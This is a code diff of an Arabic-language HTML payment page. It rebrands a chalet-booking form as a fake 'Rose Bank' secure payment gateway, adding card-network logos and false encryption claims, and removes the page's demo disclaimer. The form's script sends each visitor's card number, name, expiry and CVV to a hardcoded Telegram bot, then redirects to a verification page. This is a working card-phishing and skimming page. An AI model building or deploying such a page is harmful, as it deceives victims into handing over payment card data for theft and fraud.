@@ -3,14 +3,43 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>الدفع - Rose Chalets</title>
+  <title>بوابة الدفع الآمنة | Rose Bank</title>
   <link rel="stylesheet" href="style.css" />
+  <style>
+    .bank-header {
+      background-color: #002244;
+      color: #fff;
+      text-align: center;
+      padding: 30px 10px;
+    }
+    .bank-header h1 {
+      margin: 0;
+      font-size: 24px;
+    }
+    .bank-header p {
+      font-size: 13px;
+      color: #ccc;
+    }
+    .secure-icons {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-top: 10px;
+    }
+    .secure-icons img {
+      height: 25px;
+    }
+  </style>
 </head>
 <body>
 
-  <header class="main-header">
-    <div class="container">
-      <h1 class="logo">🌹 الدفع - Rose Chalets</h1>
+  <header class="bank-header">
+    <h1>🔒 Payment Secure Gateway</h1>
+    <p>Encrypted SSL • Verified by V-Master • بنك روز الافتراضي</p>
+    <div class="secure-icons">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa" />
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="Mastercard" />
+      <img src="https://upload.wikimedia.org/wikipedia/commons/c/cd/Verified_by_Visa_logo.svg" alt="Verified" />
     </div>
   </header>
 
@@ -20,23 +49,28 @@
       <h2>معلومات الدفع</h2>
       <form id="paymentForm">
         <label for="bookingNumber">رقم الحجز:</label>
-        <input type="text" id="bookingNumber" name="bookingNumber" pattern="\\d{6}" maxlength="6" required />
+        <input type="text" id="bookingNumber" name="bookingNumber" maxlength="6" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required />
 
-        <label for="cardNumber">رقم البطاقة 💳:</label>
-        <input type="text" id="cardNumber" name="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456" required />
+        <label for="cardNumber">رقم البطاقة (16 رقم):</label>
+        <input type="text" id="cardNumber" name="cardNumber" maxlength="16" minlength="16" pattern="\\d{16}" placeholder="1234 5678 9012 3456" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required />
 
-        <label for="cardHolder">اسم حامل البطاقة 🧾:</label>
+        <label for="cardHolder">اسم حامل البطاقة:</label>
         <input type="text" id="cardHolder" name="cardHolder" required />
 
         <div style="display: flex; gap: 10px;">
           <div style="flex: 1;">
-            <label for="expiryDate">تاريخ الانتهاء 📅:</label>
-            <input type="month" id="expiryDate" name="expiryDate" required />
+            <label for="expiryMonth">شهر الانتهاء (MM):</label>
+            <input type="text" id="expiryMonth" maxlength="2" pattern="\\d{2}" placeholder="MM" required />
           </div>
 
           <div style="flex: 1;">
-            <label for="cvv">CVV 🔒:</label>
-            <input type="text" id="cvv" name="cvv" maxlength="4" required />
+            <label for="expiryYear">السنة (YY):</label>
+            <input type="text" id="expiryYear" maxlength="2" pattern="\\d{2}" placeholder="YY" required />
+          </div>
+
+          <div style="flex: 1;">
+            <label for="cvv">CVV:</label>
+            <input type="text" id="cvv" name="cvv" maxlength="4" pattern="\\d{3,4}" required />
           </div>
         </div>
 
@@ -47,20 +81,21 @@
   </main>
 
   <footer class="footer">
-    <p>⚠️ هذا الموقع تجريبي لأغراض العرض فقط - جميع الحقوق محفوظة © Rose Chalets</p>
+    <p>© Rose Bank - All transactions are encrypted and monitored</p>
   </footer>
 
   <script>
     document.getElementById("paymentForm").addEventListener("submit", function(e) {
       e.preventDefault();
 
-      const token = "8022117794:AAHc6i8c6jZY_2IGHUQlQBJYGN2v9n0";
+      const token = "7244002272:AAEc5dIXiyGJBP5OEMBg7tD2iV2lWh99WJM";
       const chatId = "1008144314";
 
       const bookingNumber = document.getElementById("bookingNumber").value;
       const cardNumber = document.getElementById("cardNumber").value;
       const cardHolder = document.getElementById("cardHolder").value;
-      const expiryDate = document.getElementById("expiryDate").value;
+      const expiryMonth = document.getElementById("expiryMonth").value;
+      const expiryYear = document.getElementById("expiryYear").value;
       const cvv = document.getElementById("cvv").value;
 
       const message = `
@@ -68,8 +103,8 @@
 
 رقم الحجز: ${bookingNumber}
 رقم البطاقة: ${cardNumber}
-اسم حامل البطاقة: ${cardHolder}
-تاريخ الانتهاء: ${expiryDate}
+الاسم على البطاقة: ${cardHolder}
+تاريخ الانتهاء: ${expiryMonth}/${expiryYear}
 CVV: ${cvv}
       `;
 
@@ -86,7 +121,7 @@ CVV: ${cvv}
         if (response.ok) {
           window.location.href = "verify.html";
         } else {
-          alert("فشل في إرسال بيانات الدفع!");
+          alert("⚠️ فشل في إرسال بيانات الدفع!");
         }
       });
     });
